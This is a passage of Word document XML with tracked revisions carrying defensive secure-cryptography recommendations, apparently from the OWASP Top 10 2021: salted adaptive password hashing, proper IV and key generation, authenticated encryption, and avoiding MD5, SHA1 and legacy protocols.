    <w:p w14:paraId="61081E2C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="809" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F7A5C19" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="810" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="811" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Do not use legacy protocols such as FTP and SMTP for transporting</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="642BE3F3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="812" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="813" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    sensitive data.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="02D4DC50" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="814" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B14A648" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="815" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="816" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Store passwords using strong adaptive and salted hashing functions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="223BDAFF" w14:textId="4155D847" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="817" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="818" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> with a work factor (delay factor), such as </w:t>
      </w:r>
      <w:del w:id="819" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>[</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Argon2</w:t>
      </w:r>
      <w:del w:id="820" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>](https://www.cryptolux.org/index.php/Argon2), [</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="821" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">, </w:t>
        </w:r>
      </w:ins>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>scrypt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:del w:id="822" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>](https://wikipedia.org/wiki/Scrypt), [</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="823" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">, </w:t>
        </w:r>
      </w:ins>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>bcrypt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:del w:id="824" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>](https://wikipedia.org/wiki/Bcrypt)</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or</w:t>
      </w:r>
      <w:del w:id="825" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> [</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6D4D3403" w14:textId="1556E4C7" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="826" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PBKDF2</w:t>
      </w:r>
      <w:del w:id="827" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>](https://wikipedia.org/wiki/PBKDF2).</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="828" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="45D14CF4" w14:textId="4193569F" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="829" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="830" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0981FBD8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="831" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="832" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Initialization vectors must be chosen appropriate for the mode of</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5AA740B8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="833" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="834" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    operation.  For many modes, this means using a CSPRNG (cryptographically</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5D6AB5F9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="835" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="836" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    secure pseudo random number generator).  For modes that require a</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="61D3F735" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="837" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="838" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    nonce, then the initialization vector (IV) does not need a CSPRNG.  In all cases, the IV</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1BBF9FB9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="839" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="840" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    should never be used twice for a fixed key.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="215F2C2A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="841" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B2E0453" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="842" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="843" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Always use authenticated encryption instead of just encryption.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0F68BF6B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="844" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4084287D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="845" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="846" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Keys should be generated cryptographically randomly and stored in</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="29121B3A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="847" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="848" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    memory as byte arrays. If a password is used, then it must be converted</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="36AB556A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="849" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="850" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    to a key via an appropriate password base key derivation function.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="65F89913" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="851" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D155861" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="852" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="853" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Ensure that cryptographic randomness is used where appropriate, and</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="06EC38FD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="854" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="855" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    that it has not been seeded in a predictable way or with low entropy.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2F52FAC8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="856" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="857" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    Most modern APIs do not require the developer to seed the CSPRNG to</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1D6B9F54" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="858" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="859" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    get security.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="44CC16BB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="860" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6490ED22" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="861" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="862" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Avoid deprecated cryptographic functions and padding schemes, such as</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="26E60C17" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="863" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="864" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    MD5, SHA1, PKCS number 1 </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>v1.5 .</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
      </w:ins>
    </w:p>
    <w:p w14:paraId="626AA6EB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="865" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30927A09" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="866" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="867" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Verify independently the effectiveness of configuration and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E607DFD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="868" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> settings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56CE4121" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
